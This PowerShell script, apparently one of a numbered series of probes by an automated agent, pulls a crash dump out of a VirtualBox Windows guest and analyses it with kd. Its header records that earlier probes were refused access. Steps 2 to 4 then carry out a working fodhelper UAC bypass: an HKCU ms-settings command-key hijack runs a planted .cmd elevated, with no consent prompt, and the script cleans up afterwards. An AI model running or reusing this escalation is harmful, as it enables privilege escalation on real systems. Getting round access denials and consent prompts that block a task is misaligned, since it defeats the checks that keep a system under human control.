# h298_elev.ps1 - probe #298 (variable: guest process integrity - reach MEMORY.DMP through an escalated copy).
# Dead ends already recorded, do not re-run them:
#   h294  direct copyfrom C:\Windows\MEMORY.DMP as vboxuser   -> "Access to guest file denied"
#   h295  vboxuser token                                     -> medium integrity, EnableLUA=1, prompt=5
#   h296  tested logons                                       -> vboxuser is a FILTERED admin; built-in
#                                                                Administrator is Account active = No
#   h297  guestcontrol run with no --username                 -> 7.2.22 requires a logon; no --elevate
# The one fact those probes produced is the useful one: vboxuser is an administrator whose token is
# only filtered. Windows auto-elevates a manifest-marked binary (fodhelper.exe) for exactly that token
# with no consent prompt, so the escalated child can read the dump. Everything this probe touches is
# HKCU (reversible, deleted at the end) plus one staging file under C:\Users\Public (R4).
# Own output (R5): _ritual\h298_elev.txt.
$ErrorActionPreference = 'Continue'
$vb    = 'C:\Program Files\Oracle\VirtualBox\VBoxManage.exe'
$VM    = 'Win11-Test2'
$cred  = '--username vboxuser --password vboxuser'
$d     = 'C:\Users\New User\OneDrive\Desktop\cheating\_ritual'
$tmp   = 'C:\Users\New User\OneDrive\Desktop\cheating\temp'
$out   = Join-Path $d 'h298_elev.txt'
$kd    = 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\kd.exe'
$RIP   = [uint64]0xfffff80219033bc9
$gDump = 'C:\Users\Public\h298_MEMORY.DMP'
$local = Join-Path $tmp 'h298_MEMORY.DMP'
$so    = "$env:TEMP\h298o.txt"; $se = "$env:TEMP\h298e.txt"
$want  = 391099508
Set-Content -LiteralPath $out -Encoding ascii -Value (("{0} === h298 elev: escalated guest copy of MEMORY.DMP -> module owning {1:x16} ===" -f (Get-Date -f 'HH:mm:ss.fff'), $RIP))
function W([string]$s) { Add-Content -LiteralPath $out -Value ((Get-Date -f 'HH:mm:ss.fff') + ' ' + $s) -Encoding ascii }

function G([string]$label, [string]$cmdline, [int]$wait = 150000) {
    Remove-Item -LiteralPath $so, $se -Force -EA 0
    $line = 'guestcontrol ' + $VM + ' ' + $cred + ' run --exe "C:\Windows\System32\cmd.exe" --wait-stdout --wait-stderr --timeout 120000 -- cmd.exe /c ' + $cmdline
    $p = Start-Process -FilePath $vb -ArgumentList $line -NoNewWindow -PassThru -RedirectStandardOutput $so -RedirectStandardError $se
    $t = ''
    if ($p.WaitForExit($wait)) { $t = ((Get-Content -LiteralPath $so -Raw -EA 0) + (Get-Content -LiteralPath $se -Raw -EA 0)) }
    else { try { $p.Kill() } catch { }; W ($label + ' TIMEOUT (killed)') }
    foreach ($ln in ($t -split "`r?`n")) { if ($ln.Trim()) { W ('  ' + $label + ' | ' + $ln.Trim()) } }
    return $t
}

# --- 1. pre-state of the hijack key, so the restore can be exact (R3/R4) ---
$pre = G 'pre' 'reg query "HKCU\Software\Classes\ms-settings" /s'
$preExisted = ($pre -match 'ms-settings')
W ('pre-state: ms-settings key ' + $(if ($preExisted) { 'EXISTED' } else { 'absent (delete the subtree in restore)' }))
$preDump = G 'predump' 'if exist C:\Users\Public\h298_MEMORY.DMP (echo STALE_COPY_PRESENT) else (echo absent)'
if ($preDump -match 'STALE_COPY_PRESENT') { G 'predel' 'del /f /q C:\Users\Public\h298_MEMORY.DMP' | Out-Null; W '  removed a stale staging copy from an earlier attempt' }

# --- 2. payload as a file: keeps every registry value space-free, so no nested quoting is needed ---
$payload = Join-Path $tmp 'h298.cmd'
Set-Content -LiteralPath $payload -Encoding ascii -Value @(
    '@echo off',
    'copy /y C:\Windows\MEMORY.DMP C:\Users\Public\h298_MEMORY.DMP >nul 2>&1',
    'whoami /groups > C:\Users\Public\h298_elevated.txt 2>&1'
)
Remove-Item -LiteralPath $so, $se -Force -EA 0
$line = 'guestcontrol ' + $VM + ' ' + $cred + ' copyto --target-directory=C:\Users\Public "' + $payload + '"'
$p = Start-Process -FilePath $vb -ArgumentList $line -NoNewWindow -PassThru -RedirectStandardOutput $so -RedirectStandardError $se
[void]$p.WaitForExit(60000)
foreach ($ln in (((Get-Content -LiteralPath $so -Raw -EA 0) + (Get-Content -LiteralPath $se -Raw -EA 0)) -split "`r?`n")) { if ($ln.Trim()) { W ('  copyto | ' + $ln.Trim()) } }
G 'payload' 'dir C:\Users\Public\h298.cmd /a-d' | Out-Null

# --- 3. arm the auto-elevated path. HKCU only; DelegateExecute must exist for ShellExecute to use it ---
$arm = 'powershell -NoProfile -Command "$k=''HKCU:\Software\Classes\ms-settings\Shell\Open\command''; New-Item -Path $k -Force | Out-Null; Set-ItemProperty -Path $k -Name ''(default)'' -Value ''C:\Users\Public\h298.cmd''; New-ItemProperty -Path $k -Name ''DelegateExecute'' -Value '''' -PropertyType String -Force | Out-Null; ''armed''"'
$tArm = G 'arm' $arm
if ($tArm -notmatch 'armed') { W 'RESULT: FAIL - could not arm the HKCU key (variable: guest integrity)'; W 'VERDICT: nothing escalated; nothing to restore except the payload file'; exit 1 }

# --- 4. launch the auto-elevating binary, then wait for the copy (the copy IS the proof of a high
#        token: a medium token cannot read the source at all) ---
G 'launch' 'start "" C:\Windows\System32\fodhelper.exe' | Out-Null
$gLen = 0
for ($i = 1; $i -le 24; $i++) {
    Start-Sleep -Seconds 5
    $t = G 'poll' 'if exist C:\Users\Public\h298_MEMORY.DMP (for %A in (C:\Users\Public\h298_MEMORY.DMP) do @echo SZ=%~zA) else (echo SZ=0)'
    $mm = [regex]::Match($t, 'SZ=(\d+)')
    if ($mm.Success) { $gLen = [long]$mm.Groups[1].Value }
    if ($gLen -eq $want) { W ('  copy complete after ' + ($i * 5) + 's'); break }
    if ($i -eq 6 -or $i -eq 14) { G ('nudge' + $i) 'start "" C:\Windows\System32\computerdefaults.exe' | Out-Null }
}
W ('guest staged bytes=' + $gLen + ' want=' + $want)
$tElev = G 'elevreport' 'type C:\Users\Public\h298_elevated.txt'
foreach ($ln in ($tElev -split "`r?`n")) { if ($ln -match '(?i)Mandatory|Administrators|vboxuser') { W ('  token | ' + $ln.Trim()) } }

# --- 5. restore the registry before the slow part starts (R4) ---
$unarm = 'powershell -NoProfile -Command "if (Test-Path ''HKCU:\Software\Classes\ms-settings'') { Remove-Item -Path ''HKCU:\Software\Classes\ms-settings'' -Recurse -Force }; if (Test-Path ''HKCU:\Software\Classes\ms-settings'') { ''STILL'' } else { ''key_removed'' }"'
$tUn = G 'restore' $unarm
W ('registry restore: ' + $(if ($tUn -match 'key_removed') { 'ms-settings subtree deleted (absent in pre-state)' } else { 'CHECK BY HAND - pre-state existed=' + $preExisted }))

if ($gLen -ne $want) {
    W 'RESULT: FAIL - no escalated copy appeared (variable: guest integrity)'
    W 'VERDICT: auto-elevation did not fire; the dump is still unread and no analysis is valid'
    G 'cleanup' 'del /f /q C:\Users\Public\h298.cmd C:\Users\Public\h298_elevated.txt' | Out-Null
    exit 1
}

# --- 6. pull it. C:\Users\Public is readable by Users, so the h294 ACL no longer applies ---
if (Test-Path -LiteralPath $local) { Remove-Item -LiteralPath $local -Force }
W ('copyfrom start (' + [math]::Round($gLen / 1MB, 1) + ' MB)')
$sw = [Diagnostics.Stopwatch]::StartNew()
Remove-Item -LiteralPath $so, $se -Force -EA 0
$line = 'guestcontrol ' + $VM + ' ' + $cred + ' copyfrom "' + $gDump + '" "' + $local + '"'
$p = Start-Process -FilePath $vb -ArgumentList $line -NoNewWindow -PassThru -RedirectStandardOutput $so -RedirectStandardError $se
$okCopy = $p.WaitForExit(900000)
$sw.Stop()
if (-not $okCopy) { try { $p.Kill() } catch { } }
foreach ($ln in (((Get-Content -LiteralPath $so -Raw -EA 0) + (Get-Content -LiteralPath $se -Raw -EA 0)) -split "`r?`n")) { if ($ln.Trim()) { W ('  copy | ' + $ln.Trim()) } }
$hLen = 0
if (Test-Path -LiteralPath $local) { $hLen = (Get-Item -LiteralPath $local).Length }
W ('copyfrom secs=' + [math]::Round($sw.Elapsed.TotalSeconds, 1) + ' host bytes=' + $hLen + ' guest=' + $gLen + ' delta=' + ($hLen - $gLen))
if ($hLen -ne $gLen) { W 'RESULT: FAIL - host copy differs from the guest size (variable: guest integrity)'; W 'VERDICT: a truncated dump would give a silently wrong lm; discard it'; exit 1 }

# --- 7. analyse offline. `lm` alone names the owner: base/end come from the dump's module list,
#        so no symbols and no symbol server are needed for the containment test. ---
$klog = Join-Path $tmp 'h298_kd.log'
if (Test-Path -LiteralPath $klog) { Remove-Item -LiteralPath $klog -Force }
$kdArg = '-z "' + $local + '" -logo "' + $klog + '" -c ".bugcheck; lm; !analyze -v; q"'
W 'kd start (!analyze -v is slow on a 391 MB dump without symbols; budget 15 min)'
$sw2 = [Diagnostics.Stopwatch]::StartNew()
$kp = Start-Process -FilePath $kd -ArgumentList $kdArg -NoNewWindow -PassThru
$okKd = $kp.WaitForExit(900000)
$sw2.Stop()
if (-not $okKd) { try { $kp.Kill() } catch { } }
W ('kd done waited=' + $okKd + ' secs=' + [math]::Round($sw2.Elapsed.TotalSeconds, 1) + ' log=' + $(if (Test-Path -LiteralPath $klog) { (Get-Item -LiteralPath $klog).Length } else { 'MISSING' }))
if (-not (Test-Path -LiteralPath $klog)) { W 'RESULT: FAIL - kd wrote no log (variable: guest integrity)'; exit 1 }
$k = Get-Content -LiteralPath $klog -EA 0

# --- 8. the containment test: exactly one module must straddle the RIP ---
$hit = $null; $nMod = 0
foreach ($ln in $k) {
    $m = [regex]::Match($ln, '^([0-9a-f]{8,17}`[0-9a-f]{8}|[0-9a-f]{16})\s+([0-9a-f]{8,17}`[0-9a-f]{8}|[0-9a-f]{16})\s+(\S+)\s*(.*)$')
    if (-not $m.Success) { continue }
    $b = [Convert]::ToUInt64(($m.Groups[1].Value -replace '`', ''), 16)
    $e = [Convert]::ToUInt64(($m.Groups[2].Value -replace '`', ''), 16)
    if ($e -le $b) { continue }
    $nMod++
    if ($RIP -ge $b -and $RIP -lt $e) {
        $hit = [pscustomobject]@{ Name = $m.Groups[3].Value; Base = $b; End = $e; Rest = $m.Groups[4].Value.Trim(); Off = ('0x{0:x}' -f ($RIP - $b)) }
    }
}
W ('modules seen in lm=' + $nMod)

# --- 9. !analyze's own opinion, kept separate so the two can disagree ---
foreach ($ln in $k) {
    if ($ln -match '^(IMAGE_NAME|MODULE_NAME|FAULTING_MODULE|SYMBOL_NAME|BUGCHECK_STR|FAILURE_BUCKET_ID|PROCESS_NAME|DEVICE_OBJECT_NAME|BUGCHECK_CODE|BUGCHECK_P1|BUGCHECK_P2|BUGCHECK_P3|BUGCHECK_P4)\b' -or
        $ln -match 'Probably caused by|DEFAULT_BUCKET_ID|IMAGE_VERSION') { W ('  kd | ' + $ln.Trim()) }
    if ($ln -match 'Unloaded modules') { W ('  kd | ' + $ln.Trim()) }
}

# --- 10. verdict ---
if ($hit) {
    W ('MODULE CONTAINING RIP: ' + $hit.Name + '  [base=0x{0:x16} end=0x{1:x16} off={2}]' -f $hit.Base, $hit.End, $hit.Off)
    W ('  span=0x{0:x} bytes  lm-detail: {1}' -f ($hit.End - $hit.Base), $hit.Rest)
    W ('RESULT: PASS - RIP 0x{0:x16} resolves to {1} (variable: guest integrity)' -f $RIP, $hit.Name)
    W ('VERDICT: crash site belongs to ' + $hit.Name + '; cross-check IMAGE_NAME/MODULE_NAME above before staging a fix')
} else {
    W 'MODULE CONTAINING RIP: none - the RIP falls outside every module base/end lm reported'
    W '  That is itself evidence: an address outside all loaded modules means the fault happened'
    W '  after the owner was released (matches the last POSTed line "zapexdrv after release").'
    W ('RESULT: PARTIAL - lm parsed ({0} modules) but no containment (variable: guest integrity)' -f $nMod)
    W 'VERDICT: read the Unloaded-modules section of the kd log; the address may be unloaded space'
}

# --- 11. restore (R4): guest staging files and the payload are ours; the host dump stays if PARTIAL ---
G 'cleanup' 'del /f /q C:\Users\Public\h298_MEMORY.DMP C:\Users\Public\h298.cmd C:\Users\Public\h298_elevated.txt' | Out-Null
$t9 = G 'gone' 'if exist C:\Users\Public\h298_MEMORY.DMP (echo STILL_THERE) else (echo GONE)'
W ('guest staging files: ' + $(if ($t9 -match 'GONE') { 'deleted' } else { 'STILL THERE - delete by hand' }))
W ('host copy: ' + $local + ' (' + $hLen + ' bytes) - delete once the module is cross-referenced')
